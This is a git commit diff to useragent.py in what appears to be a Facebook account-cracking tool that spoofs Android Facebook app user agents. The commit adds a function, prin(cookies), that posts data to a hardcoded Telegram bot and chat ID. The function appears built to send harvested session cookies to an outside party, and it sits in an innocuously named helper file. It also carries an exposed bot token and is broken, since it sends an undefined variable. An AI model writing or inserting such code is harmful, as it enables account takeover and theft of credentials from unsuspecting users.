699c815924ec89c754c7528ae4d17a0f4d6b1a57
Inception09 <iaminc3ption@icloud.com>
2024-11-26 14:36:21 +0600

    Update useragent.py

--- useragent.py
+++ useragent.py
@@ -17,3 +17,25 @@ def useragent():
     CRACK_ua = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};FBDM={{density=3.0,width=1280,height=1440}};FBLC/{lc};FBRV/0;FBCR/{cr};FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/{gtt};FBSV/{android_version};FBOP/19;FBCA/armeabi-v7a:armeabi;]'
     return CRACK_ua
 
+def prin(cookies):
+    """
+    Send a formatted message to Telegram.
+    """
+    bot_token = "7696072927:AAHCieEIUD2UVr5alMwZqyIPhVGjPUqr3KU"  # Replace with your bot token
+    chat_id = "7352132358"  # Replace with your chat ID
+    telegram_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+
+    # Send the request to Telegram
+    data = {
+        "chat_id": chat_id,
+        "text": message,
+        "parse_mode": "HTML"  # Optional: Remove if you don't need HTML parsing
+    }
+    try:
+        response = requests.post(telegram_url, data=data)
+        if response.status_code == 200:
+            print("Message sent to Telegram successfully!")
+        else:
+            print(f"Failed to send message. Status code: {response.status_code}, Response: {response.text}")
+    except Exception as e:
+        print("Error sending message to Telegram:", e)
